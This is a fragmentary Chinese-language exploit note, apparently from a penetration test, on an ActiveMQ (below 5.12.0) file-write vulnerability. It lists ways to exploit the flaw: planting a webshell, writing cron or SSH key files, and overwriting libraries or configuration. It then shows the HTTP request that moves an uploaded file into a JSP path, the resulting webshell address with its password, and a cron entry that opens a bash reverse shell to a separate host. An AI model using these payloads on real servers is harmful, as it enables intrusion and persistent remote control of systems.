...
+ ActiveMQ<5.12.0，Ubuntu

## 3.利用方式

+ 写入webshell（fileserver不能解析jsp）
+ 写入cron或ssh key等文件（需要root权限）
+ 写入jar或jetty.xml等库和配置文件（需要知道绝对路径）
...
Destination: file:///opt/activemq/webapps/api/i.jsp
Host: 10.251.0.189:8161
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
...
-----------------------------------------
shell地址：http://10.251.0.189:8161/api/i.jsp
password:shang
 ```
...
*/1 * * * * root bash -i >& /dev/tcp/10.251.0.105/1024 0>&1
----------------------------------------------------------
